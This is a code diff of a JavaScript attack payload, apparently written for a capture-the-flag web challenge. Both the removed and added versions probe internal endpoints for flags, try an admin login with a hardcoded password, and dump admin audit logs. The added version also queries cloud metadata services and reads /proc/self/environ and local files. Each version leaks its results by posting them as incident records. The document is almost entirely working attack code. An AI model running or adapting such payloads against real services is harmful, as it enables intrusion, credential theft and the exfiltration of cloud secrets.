@@ -1,59 +1,91 @@
-// Simpler probe - no async wrapper, just sync XHR for reliability
-var O = self.location.origin;
-function P(t) {
-  try {
-    var x = new XMLHttpRequest();
-    x.open('POST', O + '/api/incidents', false);
-    x.setRequestHeader('Content-Type', 'application/json');
-    x.send(JSON.stringify({title: String(t).slice(0, 105), facility: 'Meridian-2', severity: 'Watch'}));
-  } catch(e) {}
-}
+// Probe internal service at web:3000
+(async () => {
+  var O = self.location.origin; // http://web:3000
+  var P = function(t) {
+    return fetch(O + '/api/incidents', {
+      method: 'POST', credentials: 'same-origin',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ title: String(t).slice(0, 105), facility: 'Meridian-2', severity: 'Watch' })
+    }).catch(function() {});
+  };
 
-P('P6|START|' + O);
+  await P('P7|START|' + O);
 
-// Check /api/me
-try {
-  var x = new XMLHttpRequest();
-  x.open('GET', O + '/api/me', false);
-  x.send();
-  var me = JSON.parse(x.responseText);
-  var u = me.user || {};
-  P('P6|ME|' + u.id + '|' + u.role + '|' + u.email);
-  var f = u.flag || 'none';
-  P('P6|FL|' + f.slice(0, 90));
-  if (f.length > 90) P('P6|FL2|' + f.slice(90));
-} catch(e) { P('P6|MEERR|' + e); }
+  // Try internal flag endpoints
+  var urls = [
+    O + '/flag',
+    O + '/flag.txt',
+    O + '/api/flag',
+    O + '/api/cat',
+    O + '/api/admin/flag',
+    O + '/api/admin/cat',
+    O + '/api/pwned',
+    O + '/cat',
+    'http://web:3000/flag',
+    'http://web:3000/api/flag',
+    'http://web:3000/cat',
+    'http://flag:3000/',
+    'http://flag/',
+  ];
 
-// Try localhost:3000 (common Node.js port)
-var ports = [3000, 8080, 80, 5000];
-var paths = ['/flag', '/', '/api/flag', '/flag.txt'];
-for (var i = 0; i < ports.length; i++) {
-  for (var j = 0; j < paths.length; j++) {
+  for (var i = 0; i < urls.length; i++) {
     try {
-      var x = new XMLHttpRequest();
-      x.open('GET', 'http://localhost:' + ports[i] + paths[j], false);
-      x.send();
-      P('P6|L|' + ports[i] + paths[j] + '|' + x.status + '|' + x.responseText.slice(0, 50));
+      var r = await fetch(urls[i], {credentials: 'same-origin'});
+      var t = await r.text();
+      await P('P7|URL|' + urls[i].replace(O,'') + '|' + r.status + '|' + t.slice(0, 55));
     } catch(e) {
-      P('P6|LF|' + ports[i] + paths[j] + '|' + String(e).slice(0, 50));
+      await P('P7|ERR|' + urls[i].replace(O,'') + '|' + String(e).slice(0, 55));
     }
   }
-}
 
-// Try same-origin endpoints as developer
-var eps = ['/api/admin/audit?log=2', '/api/developer/audit', '/api/developer/tools',
-           '/api/developer/exec', '/api/developer/cat', '/api/developer/flag',
-           '/api/escalations', '/api/reports', '/flag', '/api/cat',
-           '/api/admin/audit?log=../../flag'];
-for (var k = 0; k < eps.length; k++) {
+  // Try login as admin with Summer2025! from INSIDE the network
   try {
-    var x = new XMLHttpRequest();
-    x.open('GET', O + eps[k], false);
-    x.send();
-    if (x.status === 200) {
-      P('P6|EP|' + eps[k] + '|' + x.status + '|' + x.responseText.slice(0, 50));
+    var lr = await fetch(O + '/api/auth/login', {
+      method: 'POST', credentials: 'same-origin',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({email: 'admin@aegiscore-response.com', password: 'Summer2025!'})
+    });
+    var lj = await lr.json();
+    await P('P7|ADM|' + lr.status + '|' + JSON.stringify(lj).slice(0, 70));
+  } catch(e) { await P('P7|ADMERR|' + e); }
+
+  // Read fresh audit entry 2 directly
+  try {
+    var ar = await fetch(O + '/api/admin/audit?log=2', {credentials: 'same-origin'});
+    var at = await ar.text();
+    await P('P7|AUD2|' + ar.status + '|' + at.slice(0, 70));
+    // If we can read it (developer might access internally), dump the body
+    if (ar.status === 200 || at.indexOf('request_dump') > -1) {
+      var n = Math.ceil(at.length / 80);
+      for (var c = 0; c < n && c < 20; c++) {
+        await P('P7|AD|' + (c+1) + '/' + n + '|' + at.slice(c*80, (c+1)*80));
+      }
     }
   } catch(e) {}
-}
 
-P('P6|DONE');
+  // Try accessing internal docker/kubernetes metadata
+  var meta = [
+    'http://169.254.169.254/latest/meta-data/',
+    'http://metadata.google.internal/computeMetadata/v1/',
+  ];
+  for (var m = 0; m < meta.length; m++) {
+    try {
+      var r = await fetch(meta[m]);
+      await P('P7|META|' + r.status + '|' + (await r.text()).slice(0, 60));
+    } catch(e) {}
+  }
+
+  // env vars via /proc
+  try {
+    var r = await fetch('file:///proc/self/environ');
+    await P('P7|ENV|' + r.status + '|' + (await r.text()).slice(0, 60));
+  } catch(e) { await P('P7|ENVF|' + String(e).slice(0, 60)); }
+
+  // Try /flag file
+  try {
+    var r = await fetch('file:///flag');
+    await P('P7|FILE|' + r.status + '|' + (await r.text()).slice(0, 60));
+  } catch(e) { await P('P7|FILEF|' + String(e).slice(0, 60)); }
+
+  await P('P7|DONE');
+})();
